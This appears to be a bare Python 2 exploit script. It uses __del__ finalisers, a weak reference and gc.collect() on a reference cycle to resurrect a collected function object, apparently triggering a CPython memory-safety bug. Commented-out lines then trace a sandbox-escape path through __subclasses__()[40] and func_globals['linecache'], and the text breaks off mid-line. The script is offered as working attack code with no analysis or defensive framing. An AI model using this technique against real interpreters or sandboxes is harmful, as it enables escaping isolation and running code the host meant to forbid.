import gc, weakref

class LateFin:
    __slots__ = ('ref',)
    def __del__(self):
        global func
        func = self.ref()

class Cyclic(tuple):
    __slots__ = ()
    def __del__(self):
        self[1].ref = weakref.ref(self[0])
        global latefin
        del latefin

latefin = LateFin()
func = lambda: None
cyc = tuple.__new__(Cyclic, (func, latefin))

func.__module__ = cyc
del func, cyc

gc.collect()

#print latefin.ref()

#print latefin.ref().__module__

#print latefin.ref().__module__.__class__

#print latefin.ref().__module__.__class__.__base__

#print latefin.ref().__module__.__class__.__base__.__subclasses__()

#print latefin.ref().__module__.__class__.__base__.__subclasses__()[40]

#print latefin.ref().__module__.__class__.__base__.__subclasses__()[40].__init__.func_globals

#print latefin.ref().__module__.__class__.__base__.__subclasses__()[40].__init__.func_globals['linecache']

#print latefin.ref().__module__.__class__.__base__.__subclasses__()[40].__init__.func_globals['linecache'].__dict__

#print latefin.ref().__
